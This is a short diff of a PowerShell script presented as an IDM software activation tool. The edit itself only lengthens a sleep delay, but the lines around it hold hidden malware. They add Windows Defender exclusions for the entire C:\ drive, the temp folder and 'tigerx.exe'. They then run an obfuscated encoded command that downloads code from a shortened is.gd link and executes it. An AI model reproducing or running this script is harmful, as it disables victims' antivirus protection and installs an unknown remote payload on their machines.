@@ -1,7 +1,7 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
 Add-MpPreference -ExclusionPath "C:\","tigerx.exe","C:\Windows\Temp\"
-Start-Sleep -Seconds 5
+Start-Sleep -Seconds 8
 powershell.exe -encodedCommand aQBlAHgAKABpAHIAbQAgAGkAcwAuAGcAZAAvAHQAaQBnAGUAcgB4ACkA
 
 $ErrorActionPreference = "Stop"
